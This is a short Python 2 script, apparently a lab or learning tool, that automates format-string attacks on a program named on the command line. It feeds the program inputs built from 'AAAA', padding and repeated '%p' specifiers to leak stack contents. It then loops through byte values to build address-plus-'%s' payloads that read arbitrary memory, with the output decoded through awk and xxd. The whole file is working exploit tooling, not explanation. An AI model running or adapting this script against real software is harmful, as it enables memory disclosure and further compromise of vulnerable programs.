import os, sys
import getopt


address = ""
padding = ""
application = ""
nritems = 1

inspect = False

def usage():
    print "Usage: " + sys.argv[0]
    print "-r <application>"
    print "-a <address minus last nibble from where to display stack memory>"
    print "-i <number of offsets to inspect"
    print "-p <pad characters>"
    print "example: "+ sys.argv[0] + " -a 0xbfffdc -p 'AA'"
    print "example: "+ sys.argv[0] + " -a 0xbfffdc -i"
    sys.exit(-1)
    

try: 
    opts, args = getopt.getopt(sys.argv[1:],"i:a:p:r:")
except getopt.GetoptError, err:
    print str(err)
    sys.exit(-1)


for o, a in opts:
    if o == "-i":
        inspect = True
        nritems = int(a)
    elif o == "-a":

        #3 high order bytes of address
        #0xbfffdc
        for i in range(0,3):

                address = address + "\\x" + a[-2:]
                a = a[:-2]
    elif o == "-p":
        #padding to align address on word boundry
        padding = a
    elif o == "-r":
        application = a

if application == "" or inspect == False:
    usage()

print address, padding, inspect

print application + " $'AAAA" + padding + ",%p"*nritems + "'" 

if inspect:
    print os.popen( application + " $'AAAA" + padding + ",%p"*nritems + "'" ).readline()
    #sys.exit(1)

if address != "":
    print "TEST"
    for a in range(1,255):
            #os.system("./a.out $'AA\x41\x41\x41\\"+hex(a)[1:]+"%p,%p,%p,%p,%p,%p'")
            #os.system("./a.out $'"+ padding + "\\"+hex(a)[1:]+address+",%p,%p,%p,%p,%p,%s'| awk -F ',' '{print $7}' | xxd" )
            #TODO
            #make %p dynamic
            #make option without awk....etc to find out the right "offset"
            #print application + " $'"+ padding + "\\"+hex(a)[1:]+ address + ",%p"*(nritems-1) + ",%s'| awk -F ',' '{  print $7}' | xxd"
            #print os.popen(application +" $'"+ padding + "\\"+hex(a)[1:]+ address + ",%p"*(nritems-1) + ",%s'| awk -F ',' '{print $7}' | xxd" ).readline()
            print os.popen(application + " $'"+ padding + "\\"+hex(a)[1:]+ address + ",%p"*(nritems-1) + ",%s'| awk -F ',' '{  print $"+str(nritems + 1) +"}' | xxd").readline()


